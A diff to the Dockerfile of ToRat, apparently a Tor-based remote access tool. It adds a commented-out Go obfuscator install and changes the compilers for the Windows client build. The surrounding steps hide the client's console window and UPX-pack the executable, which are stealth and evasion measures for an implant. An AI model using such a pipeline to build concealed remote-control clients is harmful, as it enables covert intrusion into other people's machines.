@@ -6,6 +6,7 @@ RUN cd /ToRat && go mod download -x
 
 RUN mkdir -p /dist/server && mkdir -p /dist/client
 RUN go get -v -u github.com/lu4p/genCert
+# RUN GO111MODULE=on go get mvdan.cc/garble
 
 FROM torat-pre AS torat
 RUN /setup_docker.sh && rm /setup_docker.sh
@@ -18,7 +19,7 @@ RUN cd /ToRat/cmd/client && go build --ldflags "-s -w" -tags "tor" -o /dist/clie
 
 RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-amd64.zip 
 
-RUN cd /ToRat/cmd/client && env GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc-posix CXX=x86_64-w64-mingw32-g++-posix go build -tags "tor" --ldflags "-s -w -H windowsgui" -o /dist/client/client_windows.exe
+RUN cd /ToRat/cmd/client && env GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ go build -tags "tor" --ldflags "-s -w -H windowsgui" -o /dist/client/client_windows.exe
 
 RUN upx /dist/client/client_windows.exe --force
 RUN mkdir /dist_ext
